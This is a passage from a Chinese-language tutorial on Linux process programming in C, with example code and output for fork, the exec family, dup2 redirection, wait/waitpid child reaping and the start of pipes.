class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> var = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">var = <span class="number">200</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm child pid=%d,ppid=%d\n"</span>,getpid(),getppid());</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child,var = %d\n"</span>,var);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">var = <span class="number">288</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"parent,var = %d\n"</span>,var);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--I'm parent pid= %d,getppid = %d\n"</span>,getpid(),getppid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"=======finish======\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">I'm child pid=23313,ppid=23312</span><br><span class="line">child,var = 200</span><br><span class="line">=======finish======</span><br><span class="line">parent,var = 288</span><br><span class="line">--I'm parent pid= 23312,getppid = 15776</span><br><span class="line">=======finish======</span><br></pre></td></tr></table></figure><p>我们可以得到结论，父子进程间遵循<strong>读时共享写时复制</strong>的原则，这样设计，无论子进程执行父进程的逻辑还是执行自己的逻辑都能节省内存开销。</p><p>父子进程共享</p><ul><li>文件描述符（打开文件的结构体）</li><li>mmap建立的映射区</li></ul><h5 id="gdb调试父子进程"><a href="#gdb调试父子进程" class="headerlink" title="gdb调试父子进程"></a>gdb调试父子进程</h5><p>注意以下两种设置在fork函数调用之前才有效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set follow-fork-mode child #命令设置gdb在fork之后跟踪子进程</span><br><span class="line">set follow-fork-mode parent #设置跟踪父进程</span><br></pre></td></tr></table></figure><h4 id="exec函数族"><a href="#exec函数族" class="headerlink" title="exec函数族"></a>exec函数族</h4><p>该函数族可以将当前进程的<code>.text</code>、<code>.data</code>替换为所要加载的程序的<code>.text</code>、<code>.data</code>，然后让进程从新的<code>.text</code>第一条指令开始执行，但进程ID不变，换核不换壳。</p><h5 id="execlp函数"><a href="#execlp函数" class="headerlink" title="execlp函数"></a>execlp函数</h5><p>加载一个进程，借助PATH环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int execlp(const char *file,const char *arg,...) #成功：无返回 失败：返回-1</span><br><span class="line">参数1:要加载的程序的名字</span><br></pre></td></tr></table></figure><p>使用execlp函数执行<code>ls</code>命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//execlp("ls","-l","-d","-h",NULL); #错误写法</span></span><br><span class="line">execlp(<span class="string">"ls"</span>,<span class="string">"ls"</span>,<span class="string">"-l"</span>,<span class="string">"-h"</span>,<span class="literal">NULL</span>);</span><br><span class="line">perror(<span class="string">"exec error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm parent:%d\n"</span>,getpid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="execl函数"><a href="#execl函数" class="headerlink" title="execl函数"></a>execl函数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int execl(const char *path,const char *arg,...)  #成功：无返回 失败：返回-1</span><br><span class="line">参数1:绝对路径</span><br></pre></td></tr></table></figure><p>使用execl函数执行一个<code>a.out</code>文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">execl(<span class="string">"./a.out"</span>,<span class="string">"./a.out"</span>,<span class="literal">NULL</span>);</span><br><span class="line">perror(<span class="string">"exec error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span> )&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm parent:%d\n"</span>,getpid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="组合练习"><a href="#组合练习" class="headerlink" title="组合练习"></a>组合练习</h5><p>将<code>ps</code>命令执行后的结果写入<code>ps.out</code>文件中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">"ps.out"</span>,O_WRONLY|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"open ps.out error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dup2(fd,STDOUT_FILENO);</span><br><span class="line">execlp(<span class="string">"ps"</span>,<span class="string">"ps"</span>,<span class="string">"aux"</span>,<span class="literal">NULL</span>);</span><br><span class="line">perror(<span class="string">"execlp error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="exec函数族一般规律"><a href="#exec函数族一般规律" class="headerlink" title="exec函数族一般规律"></a>exec函数族一般规律</h5><p>exec函数一旦调用成功即执行新的程序，不返回。只有失败才返回，错误值-1。所以通常我们直接在exec函数调用后直接调用<code>perror()</code>和<code>exit()</code>，无需if判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l(<span class="built_in">list</span>) 命令行参数列表</span><br><span class="line">p(path) 搜索file时使用path变量</span><br><span class="line">v(<span class="built_in">vector</span>) 使用命令行参数数组</span><br><span class="line">e(enviroment) 使用环境变量数组</span><br></pre></td></tr></table></figure><h4 id="回收子进程"><a href="#回收子进程" class="headerlink" title="回收子进程"></a>回收子进程</h4><h5 id="孤儿进程"><a href="#孤儿进程" class="headerlink" title="孤儿进程"></a>孤儿进程</h5><p>父进程先于子进程结束，则子进程称为孤儿进程，子进程的父进程称为<code>init</code>进程，称为<code>init</code>进程领养孤儿进程</p><h5 id="僵尸进程"><a href="#僵尸进程" class="headerlink" title="僵尸进程"></a>僵尸进程</h5><p>进程终止，父进程尚未回收，子进程残留资源(PCB)存放于内核中，变成僵尸(Zombie)进程</p><h5 id="wait函数"><a href="#wait函数" class="headerlink" title="wait函数"></a>wait函数</h5><p>一个进程在终止时会关闭所有文件描述符，释放在用户空间分配的内存，但他的PCB还保留着，内核在其中保留了一些信息，如果是正常终止则保存着退出状态，如果是异常终止则保留着导致该进程终止的信号是哪个，这个进程的父进程可以调用wait或waitpid获取这些信息，然后彻底清除掉这个进程。</p><p>父进程调用wait函数可以回收子进程终止信息，该函数有三个功能</p><ul><li>阻塞等待子进程退出</li><li>回收子进程残留资源</li><li>获取子进程结束状态</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pid_t wait(int *status)</span><br><span class="line">成功：清理掉的子进程ID</span><br><span class="line">失败：-1（没有子进程）</span><br></pre></td></tr></table></figure><p>可使用wait函数传出参数status来保存进程的退出状态。借助宏函数来进一步判断进程终止的具体原因，宏函数可分为如下三组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">WIFEXITED(status) 为非<span class="number">0</span> 进程正常结束</span><br><span class="line">WEXITSTATUS(status) 如上宏为真，使用此宏 获取进程退出状态(<span class="built_in">exit</span>的参数)</span><br><span class="line">  </span><br><span class="line">WIFSIGNALED(status) 为非<span class="number">0</span> 进程异常终止</span><br><span class="line">WTERMSIG(status)如上宏为真，使用此宏 取得使进程终止的那个信号的编号</span><br><span class="line">  </span><br><span class="line">WIFSTOPPED(status) 为非<span class="number">0</span> 进程处于暂停状态</span><br><span class="line">WSTOPSIG(status) 如上宏为真，使用此宏 取得使进程暂停的那个信号的编号</span><br><span class="line">WIFCONTINUED(status) 为真 进程暂停后已经继续运行</span><br></pre></td></tr></table></figure><p>如下代码可以判断子进程的退出状态，并获取相应的状态信号编号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid,wpid;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">int</span> status;</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----child,my myid=%d,going to sleep 10s\n"</span>,getpid());</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"------------child die------------------\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">73</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid&gt;<span class="number">0</span>) &#123;</span><br><span class="line">wpid = wait(&amp;status);</span><br><span class="line"><span class="keyword">if</span> (wpid == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"wait error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(WIFEXITED(status))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child exit with %d\n"</span>,WEXITSTATUS(status));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(WIFSIGNALED(status))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child kill with signal %d\n"</span>,WTERMSIG(status));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--------parent wait finish:%d\n"</span>,wpid);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">perror(<span class="string">"fork"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="waitpid函数"><a href="#waitpid函数" class="headerlink" title="waitpid函数"></a>waitpid函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">int</span> *status,<span class="keyword">int</span> options)</span></span></span><br><span class="line">参数:</span><br><span class="line">  pid:指定回收的子进程pid</span><br><span class="line">    &gt; <span class="number">0</span>:待回收的子进程pid</span><br><span class="line">     <span class="number">-1</span>:任意子进程</span><br><span class="line">      <span class="number">0</span>:同组的子进程</span><br><span class="line">  status:(传出)回收进程的状态</span><br><span class="line">  options:WNOHANG 指定回收方式为，非阻塞</span><br><span class="line">返回值：</span><br><span class="line">  &gt; <span class="number">0</span>:表成功回收的子进程pid</span><br><span class="line">    <span class="number">0</span>:函数调用时，参数<span class="number">3</span>指定了WNOHANG，并且没有子进程结束</span><br><span class="line">   <span class="number">-1</span>:失败。errno</span><br></pre></td></tr></table></figure><p>指定某一个进程进行回收</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">pid_t</span> pid,wpid,tmpid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">2</span>) &#123;</span><br><span class="line">tmpid = pid;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"---------pid = %d\n"</span>,tmpid);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line"><span class="comment">//sleep(5); //配合WNOHANG 不阻塞</span></span><br><span class="line"><span class="comment">//wpid = waitpid(tmpid,NULL,WNOHANG);//指定一个进程回收，不阻塞</span></span><br><span class="line">wpid = waitpid(tmpid,<span class="literal">NULL</span>,<span class="number">0</span>); <span class="comment">//指定一个进程回收，阻塞回收</span></span><br><span class="line"><span class="keyword">if</span>(wpid == <span class="number">-1</span>)&#123;</span><br><span class="line">perror(<span class="string">"waitpid error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm parent,wait a child finish : %d \n"</span>,wpid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">sleep(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm %dth child,pid=%d\n"</span>,i+<span class="number">1</span>,getpid());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指定回收所有进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">pid_t</span> pid,wpid,tmpid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>((wpid=waitpid(<span class="number">-1</span>,<span class="literal">NULL</span>,WNOHANG))!=<span class="number">-1</span>)&#123; <span class="comment">//使用非阻塞方式回收</span></span><br><span class="line"><span class="keyword">if</span>(wpid &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"wait child %d\n"</span>,wpid);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(wpid == <span class="number">0</span>)&#123;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">sleep(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"I'm %dth child,pid=%d\n"</span>,i+<span class="number">1</span>,getpid());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h4><p>内核借助环形队列机制，使用内核缓冲区实现</p><h5 id="pipe函数"><a href="#pipe函数" class="headerlink" title="pipe函数"></a>pipe函数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int pipe(int fd[2])</span><br><span class="line"></span><br><span class="line">参数：fd[0]:读端</span><br><span class="line">     fd[1]:写端</span><br><span class="line">返回值：成功 0</span><br><span class="line">      失败 -1 error</span><br></pre></td></tr></table></figure><h5 id="pipe函数实现父进程写，子进程读的功能"><a href="#pipe函数实现父进程写，子进程读的功能" class="headerlink" title="pipe函数实现父进程写，子进程读的功能"></a>pipe函数实现父进程写，子进程读的功能</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 